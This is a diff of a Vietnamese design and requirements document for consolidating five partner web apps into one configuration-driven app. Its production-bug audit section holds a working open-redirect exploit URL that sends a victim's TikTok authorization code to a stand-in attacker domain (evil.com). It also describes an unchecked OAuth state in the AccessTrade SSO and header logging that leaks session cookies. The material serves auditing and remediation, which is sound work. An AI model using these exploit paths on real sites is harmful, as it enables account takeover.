@@ -2,10 +2,10 @@
 
 **Date:** 2026-09-03 (cập nhật 2026-09-04)
 **Author:** Nguyễn Đăng Định
-**Version:** 1.2
+**Version:** 2.2
 **Reviewer:** _chưa có_
 **Project Level:** Level 4 — ứng dụng mới + mở rộng backend + mở rộng admin + migrate 5 hệ thống đang chạy
-**Status:** Draft — phạm vi đã chốt, chờ review
+**Status:** Đang triển khai — bước nền cấu hình backend và màn hình admin đã xong, đã chạy thử đầu-cuối
 **Mức độ:** **P2** — không có sự cố đang diễn ra, nhưng chi phí cộng dồn theo mỗi lần onboard và mỗi lần sửa lỗi
 **Phạm vi:** ứng dụng mới `partner-app/` + mở rộng `backend/` + mở rộng `admin/` + **migrate 5 đối tác đang hoạt động theo 4 đợt**
 
@@ -232,14 +232,61 @@ fecredit     131     126     118      154        ·
 
 **Ảnh:** 20 khoá trên 5 app, chỉ **5 khoá có ở cả 5** (`logoImage`, `logoMobileImage`, `logoBrandFooter`, `decorLeft`, `decorRight`). 15 khoá còn lại là ảnh mốc thưởng có ở 4/5 hoặc 1/5. Do đó `assets` phải là **map có bộ lõi bắt buộc**, không phải danh sách trường cố định.
 
-### 2.6 Năm lỗi đang chạy trên production — phải sửa trước, ngoài phạm vi tài liệu này
+### 2.6 Lỗi đang chạy trên production — phải sửa trước, ngoài phạm vi tài liệu này
 
 Phát hiện trong quá trình khảo sát. Không do việc hợp nhất tạo ra; cần xử lý như task độc lập, là tiền đề của E2.
+
+**Trạng thái tại v1.9 — KHÔNG mục nào được vá.**
+
+Dự án này làm trên thư mục mới; **không sửa mã của 5 ứng dụng đang chạy**. Toàn bộ mục dưới
+đây là *phát hiện*, ghi lại để chủ sở hữu quyết định xử lý ở đâu và lúc nào — chúng là task
+độc lập, không thuộc phạm vi tài liệu này.
+
+| Mục | Ảnh hưởng | Hệ mới có mang theo không |
+|---|---|---|
+| PRE-1 điều hướng mở ở luồng TikTok | chiếm tài khoản, 5 app × 2 trang | **có** nếu port nguyên xi — xem cảnh báo dưới |
+| PRE-2 dự phòng cứng article ID | hiển thị văn bản pháp lý của ADV khác | **không** — PC-007 bắt buộc khai, không có dự phòng |
+| PRE-3 dữ liệu HDBank trên site khác | sai dữ liệu hiển thị | **không** — PC-007 chặn xuất bản, đã kiểm bằng E2E |
+| PRE-4 canonical sai domain | SEO, 20 chỗ trên 5 app | **không** — sinh từ `Host` |
+| PRE-5 biến toàn cục theo request + log cả header | rò dữ liệu phiên | **không** — nền mới không có `server.js` này |
+| PRE-8 (mới) `state` của SSO AccessTrade không được kiểm | chiếm liên kết tài khoản | **có** nếu port nguyên xi |
+
+⚠️ **Hai mục PRE-1 và PRE-8 là thứ hệ mới SẼ mang theo** nếu port nguyên luồng uỷ quyền như
+quyết định 04/09. Đây là chỗ duy nhất trong mục 2.6 chạm vào phạm vi tài liệu này: khi dựng
+`partner-app`, hai luồng đó phải được viết đúng ngay từ đầu chứ không chép lại.
 
 **PRE-1 — Điều hướng mở ở luồng uỷ quyền TikTok. Quyết định: GIỮ NGUYÊN (04/09).**
 `login-tiktok/index.tsx:14` và `connect-tiktok/index.tsx:12` dùng tham số `state` do bên gọi cung cấp làm đích điều hướng, không kiểm danh sách cho phép. Backend cũng không giới hạn `redirectURI` (`internal/module/social/tiktok/tiktok.go:113`); tìm `allowlist|whitelist|validateRedirect` trên `backend/internal` và `backend/pkg` không có kết quả. Quét toàn bộ nhánh remote 04/09: không nhánh nào có bản vá.
 
 **Quyết định 04/09: `partner-app` port nguyên luồng hiện tại, không thay đổi.** Ghi nhận đây là **quyết định giữ nguyên hiện trạng**, không phải kết luận đã kiểm tra và thấy an toàn — hai câu đó khác nhau và tài liệu này không có căn cứ cho câu thứ hai.
+
+#### Đính chính v1.9 — đã xác minh đường khai thác cụ thể
+
+Câu "giữ nguyên" ở trên nói về việc **`partner-app` port nguyên luồng thay vì thiết kế lại**.
+Việc xử lý trên 5 site đang chạy là **quyết định của chủ sở hữu**, không thuộc phạm vi tài
+liệu này. Ghi lại đường khai thác cụ thể để quyết định đó có đủ dữ kiện:
+
+```js
+// pages/login-tiktok/index.tsx và pages/connect-tiktok/index.tsx — GIỐNG HỆT ở cả 5 app
+window.location.href = `${query.state}dang-nhap-tiktok?code=${query.code}&redirect_uri=${redirectUri}`;
+```
+
+`query.state` đến thẳng từ URL và làm **gốc** của URL chuyển hướng. Mở
+
+```
+https://<site-that>/dang-nhap-tiktok?code=<mã uỷ quyền của nạn nhân>&state=https://evil.com/
+```
+
+là trình duyệt giao mã uỷ quyền TikTok của nạn nhân cho tên miền của kẻ tấn công — đủ để
+hoàn tất đăng nhập và chiếm tài khoản. **5 ứng dụng × 2 trang.**
+
+**Cách vá khi nào xử lý:** chỉ cho phép quay về chính tên miền của ứng dụng (`ORIGIN` hoặc
+`NEXT_PUBLIC_ORIGIN`); giá trị ngoài danh sách bị bỏ qua và luồng đi tiếp nhánh bình thường,
+nên giá trị hợp lệ không đổi hành vi. **Ràng buộc cho `partner-app`: luồng này phải viết theo
+danh sách cho phép ngay từ đầu, không chép lại bản hiện tại.**
+
+Backend cũng nhận `redirectURI` từ client và chuyển thẳng cho TikTok (`tiktok.go:113`).
+TikTok tự đối chiếu với URI đã đăng ký nên đây không phải đường rò thêm, nhưng vẫn nên siết.
 
 **PRE-2 — Giá trị fallback cứng trỏ tới bài viết pháp lý của đối tác khác.**
 ```js
@@ -257,13 +304,60 @@ Có ở `hdbank`, `lusso`, `parasola`. Đối tác quên khai một biến sẽ 
 | `lusso/configs/app.ts:65-68` | Liên kết tải app HDBank, kèm điều kiện `if (slug === 'thehdbank')` |
 | `lusso/pages/home/components/not-logged-in/index.tsx:569` | Điều kiện UI dựa trên slug chiến dịch của HDBank |
 | `lusso/pages/contact/index.tsx:75,77` | `info@hdbank.com.vn` |
-| `parasola/pages/contact/index.tsx` | Hotline `1900 6060` của HDBank |
+| `parasola/pages/contact/index.tsx:69` | Hotline `1900 6060` của HDBank |
+| `lusso/pages/contact/index.tsx:69` | Hotline `1900 6060` của HDBank — **bản khảo sát đầu bỏ sót chỗ này** |
+
+**PRE-3 cần người quyết, không phải việc của kỹ thuật.** Không ai trong nhóm phát triển
+biết hotline, email và ba kênh mạng xã hội **đúng** của `lusso` và `parasola`. Sửa bằng cách
+đoán là thay một giá trị sai bằng một giá trị sai khác, lần này còn khó phát hiện hơn vì
+trông có vẻ hợp lý.
+
+Hai lý do nữa để không vội:
+
+1. Đây đúng là loại dữ liệu mà PC-002/PC-017 chuyển về khai trong admin. Sửa cứng trong mã
+   bây giờ là làm một việc sắp bị xoá.
+2. Cửa kiểm chéo của PC-007 **đã chặn** đường lây sang hệ mới: công cụ trích cấu hình
+   (PC-016) đọc từ chính các ứng dụng này, và bất kỳ giá trị nào đã đăng ký cho ADV khác sẽ
+   bị từ chối lúc xuất bản. Đã kiểm bằng test đầu-cuối với đúng hai giá trị `1900 6060` và
+   `info@hdbank.com.vn`.
+
+**Việc cần người quyết:** đội vận hành cung cấp hotline, email và ba kênh mạng xã hội đúng
+của `lusso` và `parasola`. Có giá trị rồi thì khai thẳng vào cấu hình ADV — không cần sửa mã.
 
 **PRE-4 — Thẻ canonical trỏ sai domain ở cả 5 ứng dụng.**
 `wrappers/home.tsx` gán `url: process.env.ORIGIN`, trong khi `ORIGIN = https://ambassador.koc.com.vn/` ở cả 5; giá trị này dùng cho `<link rel="canonical">` và `og:url`. Nguyên nhân là nhầm giữa `ORIGIN` (domain callback dùng chung) và `NEXT_PUBLIC_ORIGIN` (domain đối tác).
 
+Rà lại thì **rộng hơn bản khảo sát đầu**: ngoài `wrappers/home.tsx` còn
+`layouts/event-detail/index.tsx` và `pages/partner-home/index.tsx` — tức là trang chủ, trang
+chi tiết chiến dịch và trang chủ theo ADV, cả ba đều khai canonical về tên miền của người
+khác. Đã đổi 20 chỗ trên 5 ứng dụng.
+
+Bốn chỗ `redirect_uri` của TikTok và một chỗ phân giải partner **vẫn dùng `ORIGIN`** — chúng
+gắn với tên miền đã đăng ký, đổi là hỏng luồng đăng nhập.
+
 **PRE-5 — Trạng thái toàn cục theo request tại tầng SSR.**
 `server.js:25-26` gán `global._cookies` và `global._navigatorLang` trên tiến trình dùng chung. Hiện không nơi nào đọc, nên chưa gây hậu quả. Cần loại bỏ trước khi hợp nhất.
+
+Ngay dòng dưới còn một lỗi **mới tìm ra**: `console.log('👨‍💻 Log PARAMS 👉 ctx:', ctx.request)`
+in nguyên đối tượng request mỗi lần gọi, tức là ghi cả khối header — gồm cookie phiên và
+`Authorization` — vào log máy chủ của cả 5 ứng dụng.
+
+**PRE-8 — `state` của luồng SSO AccessTrade sinh ra nhưng không bao giờ được kiểm.**
+
+Không có trong bản khảo sát đầu; tìm ra khi rà PRE-1. Khác PRE-1 ở chỗ đây là luồng
+AccessTrade, không phải TikTok.
+
+`accesstrade-section/index.tsx` sinh `state`, gửi đi, rồi ở nhánh quay về chỉ đọc `code` và
+đổi lấy token — **không đối chiếu `state`**. Ai dụ được nạn nhân mở
+`/lien-ket-tai-khoan?code=<mã của kẻ tấn công>` sẽ gắn tài khoản AccessTrade **của kẻ tấn
+công** vào tài khoản nạn nhân; nạn nhân thấy màn hình báo liên kết thành công.
+
+Hai lỗi phụ cùng chỗ: `state` là `sha256` của mốc thời gian mili giây (đoán được nếu biết
+người dùng bấm lúc nào), và được tính **một lần lúc nạp module** nên mọi lần liên kết trong
+cùng phiên dùng chung một giá trị.
+
+**Ràng buộc cho `partner-app`:** `state` sinh bằng nguồn ngẫu nhiên mật mã, mới cho mỗi lần
+bấm, lưu lại và đối chiếu khi quay về, dùng một lần rồi xoá.
 
 **PRE-6 — Mỗi trang nạp HAI container GTM, và ba ADV bắn dữ liệu vào container của ADV khác.**
 
@@ -481,6 +575,28 @@ fontFiles[]   { family, weight, style, url }
 
 **Admin hiện `primary` ở trên cùng, 21 khoá còn lại gấp trong mục Nâng cao.** Đủ trường trong lược đồ không có nghĩa là đổ hết 22 ô lên màn hình.
 
+#### Đính chính khi triển khai (v1.8): mặc định là để KHÔNG khai, không phải để khai sẵn
+
+Bản trước ngầm hiểu ADV khai đủ token rồi ghi đè. Lúc dựng màn hình mới thấy hệ quả: nếu
+bắt khai đủ thì **mỗi ADV giữ một bản sao của cùng một giá trị**, và sửa mặc định về sau
+không ADV nào nhận được — đúng cái bệnh "mỗi ADV một mã nguồn" mà hệ này sinh ra để chữa,
+chỉ đổi chỗ từ mã nguồn sang cơ sở dữ liệu.
+
+Nên chốt lại ba điểm:
+
+1. **Không token nào bắt buộc, kể cả `primary`.** Bản nháp và bản xuất bản đều chấp nhận
+   theme rỗng. Cái được kiểm là **định dạng của giá trị có mặt** (phải là hex 3 hoặc 6 ký
+   tự), không phải sự có mặt của khoá.
+2. **Hợp nhất với mặc định chạy ở SERVER**, trong endpoint công khai, không ở frontend.
+   Để frontend tự điền mặc định là frontend phải giữ một bản sao của bộ giá trị đó — bản
+   sao ấy sẽ lệch dần, và lệch im lặng.
+3. **`primaryForeground` không tồn tại.** Bản v1.2 nhắc token này khi rút danh sách xuống
+   2 khoá; nó không nằm trong 18 khoá của khối `//Color`, và cách dùng độ mờ ở trên khiến
+   nó không cần thiết. Danh sách chuẩn là **18 khoá màu + 4 bo góc**, không có ngoại lệ.
+
+Bo góc `0` là **giá trị hợp lệ** (góc vuông), không phải "chưa khai" — lớp hợp nhất duyệt
+theo khoá có mặt, không so với `0`.
+
 #### ⚠️ KHÔNG có phép tính màu ở bất kỳ đâu
 
 Bootstrap 5.2.3 tính hover và active **lúc biên dịch** bằng hàm SCSS, không chạy được trong trình duyệt:
@@ -505,6 +621,9 @@ Hover và active **không phải màu mới** — là chính token đó ở đ�
 
 **AC:**
 - [ ] Đổi `primary`, xuất bản, tải lại: giao diện đổi, không build lại
+- [ ] ADV **không khai token nào** vẫn xuất bản được, và endpoint công khai trả **đủ 18 màu + 4 bo góc + font** lấy từ mặc định
+- [ ] Khai `radius.base = 0` thì endpoint công khai trả `0`, không bị mặc định `8` đè
+- [ ] Gõ hex sai trong admin: ô báo lỗi **tại chỗ**, ô xem trước màu không vẽ giá trị hỏng
 - [ ] Đổi `radius.base` từ 8 sang 0: nút và thẻ ra góc vuông, không cần sửa mã
 - [ ] `grep -rE "#[0-9a-fA-F]{6}" partner-app/src` (trừ file token) trả về **0**
 - [ ] `grep -rE "shade-color|tint-color|color-contrast"` trên toàn repo trả về **0**
@@ -670,7 +789,7 @@ Người vận hành phải lưu được bản dở dang. Nhưng xuất bản t
 
 | Cửa | Chặn cái gì |
 |---|---|
-| Token giao diện | thiếu `primary` hoặc `primaryForeground`, hoặc không phải mã hex |
+| Token giao diện | giá trị có mặt không phải mã hex, bo góc âm, file font thiếu tên hoặc đường dẫn — **không** đòi khoá nào phải có mặt, xem đính chính ở PC-002 |
 | Section | thiếu `hero`/`events`, loại ngoài danh mục, `key` trùng hoặc rỗng |
 | **Trường bắt buộc** | thiếu bất kỳ trong 7: `website`, `footerBrandLink`, `contact.hotline`, `contact.email`, 3 article ID |
 | **Dữ liệu đối tác khác** | cấu hình chứa domain, hotline, email hoặc article ID đã đăng ký cho đối tác khác |
@@ -680,6 +799,21 @@ Hai cửa cuối là chốt chặn cho lỗi **đang chạy trên production**: 
 Khi migrate, cấu hình được **trích tự động từ chính các ứng dụng đó**. Không chặn ở bước xuất bản thì các giá trị sai theo sang hệ mới và trở thành dữ liệu chính thức — khó phát hiện hơn bây giờ.
 
 **Trường bắt buộc không có giá trị mặc định và không kế thừa.** Nguyên nhân gốc của cả hai lỗi trên là các giá trị này được **thừa hưởng** chứ không được **hỏi**.
+
+#### Đính chính khi triển khai (v1.8): dấu hiệu ADV khác phải là HOST, không phải URL đầy đủ
+
+Bản đầu dựng danh sách dấu hiệu từ `website` của ADV khác, để nguyên dạng URL
+(`https://hdbank.com.vn/`). Test đầu-cuối bắt được ngay: cách đó **chỉ khớp khi bị chép y
+hệt**, trong khi giá trị lẫn thật lại là liên kết trỏ vào một đường dẫn khác cùng tên miền
+— ảnh trên CDN, trang tải ứng dụng. Đúng ca `lusso` đang mang link tải app của HDBank.
+
+Nên dấu hiệu lấy **host** của `website` (`hdbank.com.vn`), cộng với `allowDomains`, hotline,
+email và ba mã bài viết đọc từ cấu hình **đã xuất bản** của ADV đó — lùi về bản nháp khi họ
+chưa xuất bản lần nào, vì lúc chuyển sang hệ mới chưa ai xuất bản mà đó đúng là lúc cần
+chặn nhất.
+
+Phép dò đi **đệ quy** qua cả `content` lẫn `assets`: chỗ hay sai nhất lại nằm trong mảng
+object (`social[]`), dò nông sẽ bỏ sót đúng chỗ đó.
 
 **Khoá cache khớp tuyệt đối** giữa frontend và backend. Lệch một ký tự thì purge không trúng gì cả — xuất bản xong trang vẫn cũ và **không ai thấy lỗi**. Bắt buộc có test đối chiếu hai phía.
 
@@ -704,7 +838,10 @@ Request có token xem trước phải bỏ qua cache hoàn toàn: đọc thẳng
 - [ ] Khôi phục: trạng thái về đúng như trước, bản nháp không bị đụng
 - [ ] Xuất bản cấu hình chứa `info@hdbank.com.vn` cho đối tác khác HDBank: **từ chối**, thông báo nêu tên đối tác bị lẫn
 - [ ] Xuất bản khi thiếu `contact.hotline`: từ chối, thông báo liệt kê **đủ** các trường thiếu, không dừng ở cái đầu tiên
+- [ ] Xuất bản cấu hình chứa liên kết trỏ vào **subdomain** của ADV khác (`cdn.hdbank.com.vn`): từ chối
 - [ ] Có test đối chiếu khoá cache hai phía
+- [ ] Xuất bản lần hai làm endpoint công khai trả bản mới **ngay lần gọi kế tiếp** — chứng minh khoá xoá cache trùng khoá đọc
+- [ ] Xuất bản thất bại: hộp thoại trong admin **đóng lại**, thông báo lỗi ở lại — không che mất ô cần sửa
 
 ---
 
@@ -716,9 +853,9 @@ Xây trong `admin/` hiện hành (umi 3 + antd 4), đặt cạnh biểu mẫu đ
 
 | Nhóm | Nội dung |
 |---|---|
-| Nhận diện | tên, slug, domain, `primary`, `primaryForeground`, font |
+| Nhận diện | tên, slug, domain, 18 khoá màu + 4 bo góc (ô trống = dùng mặc định), font |
 | Asset | 7 khoá lõi + file font + khoá mở rộng |
-| Nội dung | 4 article ID, liên hệ, mạng xã hội, liên kết footer, liên kết tài liệu |
+| Nội dung | 3 article ID (xem v1.3), liên hệ, mạng xã hội, liên kết footer, liên kết tài liệu |
 | SEO | title, description, keywords, GTM |
 | Phân hệ | công tắc `contract`, `affiliate` |
 | Trang chủ | danh sách section: thêm, xoá, kéo sắp xếp, sửa nội dung theo từng loại — **xem phân tích bên dưới** |
@@ -967,17 +1104,39 @@ Thêm nữa, mọi vai trò hiện có `Scopes` **rỗng** (`dummy_db.go:82` see
 | Làm | Không làm |
 |---|---|
 | Thêm vai trò `config_editor` vào `StaffRole` | Kích hoạt hệ scope 20 mã |
-| Guard mới cho 5 endpoint `app-config` | Chặn ở server `staff.Partner` trong 12 service admin cũ |
+| Guard mới cho 6 endpoint `app-config` | Chặn ở server `staff.Partner` trong 12 service admin cũ |
 | Kiểm `staff.Partner` **chỉ trong** các endpoint cấu hình mới | Đổi hành vi của bất kỳ endpoint đang chạy nào |
 
 Hai cột phải là task riêng có kế hoạch di dữ liệu. Gộp vào dự án hợp nhất frontend là mở hai mặt trận cùng lúc.
 
 **Ràng buộc theo ADV hiện chắp vá.** `staff.Partner` được kiểm ở đúng hai vùng — `handler/leaderboard_view.go:123,131` và `service/event_bonus.go` (5 chỗ). Event, content, article, category, news, quick-action đều **không kiểm**. Yêu cầu này không sửa việc đó, chỉ bảo đảm endpoint mới không lặp lại.
 
+#### ⚠️ Đính chính khi triển khai (v1.8): thêm một vai trò đụng BA danh sách, và bản gieo bỏ qua môi trường đang chạy
+
+Thêm `config_editor` xong, chạy thử thì vai trò **không xuất hiện dưới cơ sở dữ liệu** và
+guard mới im lặng không cho ai qua. Hai nguyên nhân, đều là bẫy sẵn có chứ không phải lỗi
+của yêu cầu này:
+
+1. **Ba danh sách vai trò song song.** `constants.StaffRole` (mã), `constants.StaffRoleName`
+   (nhãn) và `constants.Roles` (bản gieo xuống DB) là ba bản viết tay tách rời. Thêm vai trò
+   mà quên bản thứ ba thì vai trò đó không bao giờ có bản ghi, và **không có lỗi nào báo ra**
+   — về mặt kỹ thuật chẳng có gì hỏng cả.
+   → `Roles` nay **sinh từ** `StaffRoleList` + `StaffRoleNameList`, có test canh ba bản khớp nhau.
+
+2. **`GenerateRole` thoát ngay khi đã có bất kỳ vai trò nào** (`dummy_db.go` — `if total > 0 { return }`).
+   Nghĩa là mọi môi trường đang chạy — vốn đã có sẵn hai vai trò — **sẽ không bao giờ nhận
+   được vai trò mới**, kể cả sau khi deploy.
+   → Nay xét **từng vai trò một**, chỉ gieo cái còn thiếu. Đã xác nhận trên một cơ sở dữ liệu
+   đã có sẵn hai vai trò: lần khởi động sau in `Generate 1 roles success`.
+
+Bài học rộng hơn cho các yêu cầu sau: **thêm hằng số vào một danh sách trong repo này thì
+phải đi tìm các bản sao của danh sách đó trước.**
+
 **AC:**
 - [ ] `config_editor` của ADV X đọc và ghi được `app-config` của X
 - [ ] `config_editor` của ADV X gọi `app-config` của ADV Y → **401**
 - [ ] `config_editor` **không** tạo, xoá hay đổi trạng thái được ADV nào
+- [ ] Vai trò mới xuất hiện dưới DB **của môi trường đã có sẵn vai trò cũ**, không chỉ trên DB trắng
 - [ ] `root` giữ nguyên mọi quyền hiện có
 - [ ] Không endpoint nào đang chạy đổi hành vi — đối chiếu bằng danh sách route trước/sau
 
@@ -1067,6 +1226,196 @@ Một ADV mới chạy hai chiến dịch phải soạn **7 bài**, không phả
 - [ ] Thiếu bất kỳ trong ba: chặn xuất bản
 - [ ] Không có `SUPPORT_ARTICLE_ID` trong lược đồ
 - [ ] Danh sách kiểm onboard (PC-014) đếm đúng số bài cần soạn theo số chiến dịch
+
+---
+
+### PC-018: Lược đồ cấu hình do server phát ra, admin không khai lại
+
+**Priority:** Must Have — yêu cầu mới tại v1.8, phát sinh khi dựng màn hình
+
+**Vì sao cần.** Màn cấu hình cần bốn thứ để dựng được: danh mục section hợp lệ, danh sách
+khoá màu chuẩn, giá trị mặc định của từng khoá, và danh sách trường bắt buộc. Cả bốn **đã
+nằm trong mã nguồn backend** — đó là nơi luật được thi hành.
+
+Nếu admin khai lại một bản của riêng mình thì có hai nguồn sự thật, và cái sai sẽ **im
+lặng** theo đúng một trong hai chiều:
+
+| Lệch kiểu gì | Người dùng thấy gì |
+|---|---|
+| Admin có khối mà server không nhận | Thêm khối, bấm lưu, bị từ chối, không hiểu vì sao khối đó có trong danh sách |
+| Server nhận khối mà admin không hiện | Khối không bao giờ dùng được, không có dấu hiệu nào để lần ra |
+| Admin thiếu một trường bắt buộc mới | Lỗi lúc xuất bản, mà màn hình **không có ô nào để sửa** |
+
+Đây đúng là dạng phân kỳ mà cả dự án sinh ra để xoá — chỉ đổi chỗ từ giữa 5 frontend sang
+giữa admin và backend.
+
+**Một endpoint, đọc-chỉ, không gắn ADV nào** (siêu dữ liệu hệ thống, chỉ cần đăng nhập):
+
+```
+GET /partners/app-config/schema
+  sections[]             { type, removable, repeatable, nav } — thứ tự ỔN ĐỊNH
+  defaultSections[]      bộ khối khởi đầu của một ADV mới
+  theme.colorKeys[]      18 khoá
+  theme.radiusKeys[]     4 khoá
+  theme.default          bộ token mặc định đầy đủ
+  requiredContentPaths[] 7 đường dẫn bắt buộc
+```
+
+**Thứ tự phải ổn định.** Danh mục section lưu dạng map; duyệt map trong Go cho thứ tự ngẫu
+nhiên, nên nếu không sắp thì danh sách khối trong admin **nhảy chỗ mỗi lần tải lại trang**.
+
+**Ô nhập của phần bắt buộc dựng TỪ `requiredContentPaths`**, không viết tay theo cây trường
+— nhờ đó thêm một trường bắt buộc ở server là màn hình tự có ô cho nó.
+
+#### `defaultSections` — ADV mới mở lên đã có trang, không phải trang trắng
+
+Bộ khởi đầu là `hero → statistic → events → content-highlight`, đúng thứ tự bốn khối mà cả
+năm ADV đang chạy dùng hôm nay (`<adv>/src/pages/partner-home/desktop.tsx`). Việc người vận
+hành phải làm là **ĐỔI**, không phải **DỰNG**.
+
+Bộ này chưa ghi xuống cơ sở dữ liệu — chỉ trả về khi ADV chưa có bản ghi, ghi thật khi bấm lưu.
+
+**AC:**
+- [ ] Danh mục trả về phủ **đúng** danh mục trong mã nguồn — không thiếu, không thừa; có test canh
+- [ ] Gọi hai lần cho thứ tự **giống hệt**
+- [ ] `defaultSections` tự nó qua được luật kiểm section — ADV mới mở màn hình không thấy lỗi ở trạng thái chưa ai chạm vào
+- [ ] `grep` trong `admin/src` không thấy danh sách khoá màu, danh mục section hay danh sách trường bắt buộc nào được khai lại
+- [ ] Thêm một loại section ở backend: admin hiện nó ra **mà không cần sửa mã admin**
+
+### PC-019: Cạm bẫy nền tảng khi dựng lại giao diện — năm thứ hỏng lặng
+
+**Priority:** Must Have — yêu cầu mới tại v2.0, phát sinh khi dựng lại 21 màn hình
+
+**Vì sao cần.** Cả ba mục dưới đây **biên dịch sạch, không lỗi runtime, không cảnh báo**.
+Không có kiểm thử tự động nào bắt được: kiểu dữ liệu đúng, DOM đúng, chỉ có hình ảnh sai.
+Chúng chỉ lộ ra khi mở trình duyệt và nhìn — nên phải ghi thành ràng buộc, không thì mỗi
+đợt migrate lại vấp một lần.
+
+**1. SVGR xoá `viewBox`.** Bộ tối ưu mặc định của SVGO bỏ `viewBox` ở mọi file **có sẵn
+`width`/`height`** — và 161/161 icon port từ ứng dụng cũ đều có. Mất `viewBox` thì path vẽ
+theo toạ độ gốc 24 đơn vị **bên trong khung 16px người gọi yêu cầu**, tức chỉ hiện góc trên
+trái của hình: chuông thông báo thành một nét cong, mũi tên thành gạch chéo. Phải đặt
+`removeViewBox: false`, và `dimensions: false` để `width` truyền từ props có tác dụng thật.
+
+**2. Token `muted` của partner là màu CHỮ; shadcn coi `muted` là màu NỀN.** Bộ token đang
+chạy đặt `muted: #8b9092` — xám dùng cho chữ phụ. shadcn dùng `bg-muted` cho thanh tab và
+vằn bảng, vốn mong một màu nền rất nhạt. Nối thẳng hai cái vào nhau cho ra **chữ xám trên
+nền xám**. Các bề mặt đó phải trỏ sang `light`; **không được** định nghĩa lại `muted` trong
+lớp cầu nối, vì như thế sẽ hỏng `text-muted` ở mọi nơi khác.
+
+**3. `background` của partner là nền TRANG có sắc, không phải màu trắng.** `fecredit` chạy
+nền bạc hà, `hdbank` chạy trắng. shadcn mặc định `background` là trắng và dùng luôn làm bề
+mặt cho hộp thoại, popover và nút viền. Hộp thoại `bg-background` đặt trên nền có sắc trông
+**như lớp phủ không hiện** — người dùng không phân biệt được đâu là hộp thoại. Những bề mặt
+đó phải dùng `popover`/`card`.
+
+**4. SVGO đổi TÊN mọi id thành `a`.** 51/193 icon có `clipPath`, `mask` hoặc gradient tham chiếu bằng `url(#…)`. Bộ tối ưu rút gọn mọi id thành `a`, mà id là **toàn cục trong một document** khi icon được nhúng thẳng vào DOM — nên mười icon trên một trang đều trỏ về `#a` ĐẦU TIÊN, và chín cái còn lại bị cắt theo vùng clip của một glyph khác. Icon "sao chép" ra một góc vụn. Phải bật `prefixIds` để mỗi tập tin có tiền tố riêng.
+
+**5. Tailwind v4 đổi mặc định `border-color` sang `currentColor`.** v3 mặc định là xám nhạt. Component shadcn viết `border` trần và trông đợi một lớp base cấp màu; thiếu lớp đó thì **mọi** thẻ, dropdown và ô đều viền màu CHỮ, tức gần đen. Không có cảnh báo nào.
+
+**Điểm chung cần rút ra:** ánh xạ token của partner sang tên ngữ nghĩa của thư viện component
+**không phải phép nối tên giống nhau**. Cùng một từ (`muted`, `background`) mang hai nghĩa
+khác nhau ở hai hệ; nối theo tên cho ra giao diện sai mà không có tín hiệu lỗi nào. Cũng
+vậy với công cụ: mặc định của SVGO và của Tailwind đều đổi theo phiên bản, và cả hai đổi
+theo hướng **hỏng im lặng** chứ không báo lỗi.
+
+**AC:**
+- [ ] Mở một trang bất kỳ, mọi `<svg>` trong DOM đều có thuộc tính `viewBox`
+- [ ] Không có hai phần tử nào trong DOM trùng `id` — kiểm bằng một dòng script, không bằng mắt
+- [ ] Thẻ và dropdown viền màu nhạt, không phải màu chữ
+- [ ] Icon yêu cầu `width={16}` chiếm đúng 16px và hiện **trọn** hình, không phải một góc
+- [ ] Thanh tab, vằn bảng, hộp thoại và popover đều **tương phản được** với nền trang trên cả `fecredit` (nền bạc hà) và `hdbank` (nền trắng)
+- [ ] Lớp cầu nối token có chú thích ghi rõ vì sao `muted` và `background` **không** nối thẳng
+
+---
+
+### PC-020: Dải màu là một loại token, không gộp được vào bảng màu phẳng
+
+**Priority:** Must Have — yêu cầu mới tại v2.2, phát sinh khi đối chiếu trang chủ với trang đang chạy
+
+**Vì sao cần.** Bộ 18 màu **phẳng** không tả được `fecredit`. Tiêu đề khối, nút chính và nền
+trang của họ đều là **dải màu ba chặng** (`#2ECEFF → #0DD09F → #00A078`). Ép về một màu
+phẳng là chỗ sai lệch dễ thấy nhất giữa hệ mới và trang đang chạy: tiêu đề xanh lá thay vì
+xanh ngọc, nút phẳng thay vì chuyển sắc, nền một màu thay vì gradient.
+
+Không gộp được vào `colors`: một dải màu là **nhiều chặng màu cộng một góc**, còn `colors`
+là map chuỗi-một-màu.
+
+**Lưu thành DỮ LIỆU, không phải chuỗi CSS.** Chuỗi `linear-gradient(...)` từ cấu hình sẽ đi
+thẳng vào thuộc tính `style` của thẻ gốc, tức **tiêm CSS tuỳ ý** — đúng thứ mà bộ kiểm màu
+sinh ra để chặn. Góc và các chặng được kiểm riêng rồi hệ thống tự ghép chuỗi.
+
+```
+theme.gradients { <tên>: { angle?: number, stops: [{ color: "#hex", at?: 0-100 }] } }
+```
+
+Ba tên đang dùng: `heading`, `cta`, `page`.
+
+**Đòi tối thiểu HAI chặng.** Một chặng là màu phẳng viết dài dòng; nhận vào thì một lần
+nhập sai ở admin sẽ **âm thầm làm phẳng cả nhận diện thương hiệu** thay vì báo lỗi.
+
+**Mọi chỗ dùng phải rơi về màu phẳng.** `var(--gradient-x, var(--color-y))` — ADV không khai
+dải màu nào thì nhận đúng thứ họ vẫn có. Đây cũng là lý do dùng được `background-clip: text`
+cho cả hai: tô chữ bằng một màu đặc cũng chạy y như tô bằng dải màu.
+
+**AC:**
+- [ ] `ResolveTheme` GIỮ `gradients`; ADV không khai thì **không** có dải màu mặc định nào
+- [ ] Mỗi chặng qua đúng bộ kiểm hex như một màu phẳng; chặng sai làm hỏng **cả** dải màu, không phải nửa dải
+- [ ] Vị trí chặng ngoài 0-100 bị từ chối lúc xuất bản
+- [ ] Gỡ hết `gradients` khỏi cấu hình: trang vẫn đúng, chỉ phẳng màu — không chỗ nào trống
+
+---
+
+### PC-021: Quy ước hiển thị đo TỪNG MÀN, không suy ra một thang chung
+
+**Priority:** Must Have — yêu cầu mới tại v2.2, phát sinh khi soi từng trang
+
+**Vì sao cần.** Đối chiếu từng màn với trang đang chạy cho thấy các quy ước hiển thị
+**khác nhau theo màn**, và mỗi lần tự suy ra một thang chung là một lần lệch:
+
+| Quy ước | Giá trị thật | Suy đoán sai đã mắc |
+|---|---|---|
+| Cỡ tiêu đề khối | Trang chủ **36px**, màn chi tiết **20px** | Dùng 36px cho cả hai; màn chi tiết to gấp rưỡi |
+| Tuổi bài đăng | Tương đối trong **8 ngày**, sau đó ngày giờ tuyệt đối | Luôn tương đối; "47 ngày trước" bắt người đọc tự tính |
+| Định dạng ngày giờ | `DD/MM/YYYY - HH:mm` | `Intl` với `dateStyle`/`timeStyle` cho `18:28 26/8/26` — giờ trước, năm hai chữ số |
